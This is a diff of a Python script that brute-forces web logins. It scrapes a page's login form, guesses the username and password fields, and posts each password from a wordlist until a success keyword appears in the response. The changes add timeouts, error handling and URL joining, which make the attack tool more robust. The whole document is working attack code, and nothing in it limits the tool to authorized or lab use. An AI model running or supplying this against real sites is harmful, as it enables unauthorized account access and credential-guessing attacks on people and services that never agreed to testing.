@@ -1,21 +1,28 @@
 import requests
 from bs4 import BeautifulSoup
+from urllib.parse import urljoin
 import time
 
 
 def get_login_form(login_url):
-
+    """
+    Fetch and parse the login form from a webpage.
+    """
     session = requests.Session()
-    response = session.get(login_url)
+
+    try:
+        response = session.get(login_url, timeout=10)
+    except requests.RequestException as e:
+        return None, None, None, None  # Handle in calling function
 
     soup = BeautifulSoup(response.text, "html.parser")
     form = soup.find("form")
+    if not form:
+        return None, None, None, None
 
-    # Extract form action and method
-    action = form.get("action")
+    action = form.get("action", "")
     method = form.get("method", "post").lower()
 
-    # Extract all input fields
     fields = {}
     for input_tag in form.find_all("input"):
         name = input_tag.get("name")
@@ -26,7 +33,7 @@ def get_login_form(login_url):
     return session, action, method, fields
 
 
-def run_bruteforce_streamlit(
+def run_bruteforce(
     login_url,
     username,
     wordlist_path,
@@ -37,10 +44,10 @@ def run_bruteforce_streamlit(
     delay=0,
 ):
 
-    # Load the form structure and session
     session, action, method, form_data = get_login_form(login_url)
+    if None in (session, action, method, form_data):
+        return "[!] Error loading or parsing the login form."
 
-    # Use manual overrides if provided, otherwise try to auto-detect
     username_field = user_field_override or next(
         (k for k in form_data if "user" in k.lower()), None
     )
@@ -51,34 +58,31 @@ def run_bruteforce_streamlit(
     if not username_field or not password_field:
         return "[!] Could not identify login fields. Please provide field names."
 
-    # Load wordlist into memory
-    with open(wordlist_path, "r", encoding="latin-1") as f:
-        passwords = f.readlines()
+    try:
+        with open(wordlist_path, "r", encoding="latin-1") as f:
+            passwords = f.readlines()
+    except Exception as e:
+        return f"[!] Error reading wordlist: {e}"
 
     total = len(passwords)
 
-    # Start brute-force loop
     for i, password in enumerate(passwords):
         password = password.strip()
         form_data[username_field] = username
         form_data[password_field] = password
 
-        # Construct full URL for form submission
-        full_action_url = (
-            login_url + action if not action.startswith("http") else action
-        )
+        full_action_url = urljoin(login_url, action)
 
-        # Send login attempt
-        response = session.post(full_action_url, data=form_data)
+        try:
+            response = session.post(full_action_url, data=form_data, timeout=10)
+        except requests.RequestException:
+            continue  # Skip failed attempt
 
-        # Check if success keyword is found
         if success_keyword.lower() in response.text.lower():
             update_progress(100)
             return f"[+] SUCCESS: Password found: **{password}**"
 
         update_progress(int(((i + 1) / total) * 100))
-
-        # Wait for a short delay to avoid overwhelming the server
         time.sleep(delay)
 
     return "[-] Password not found in wordlist."
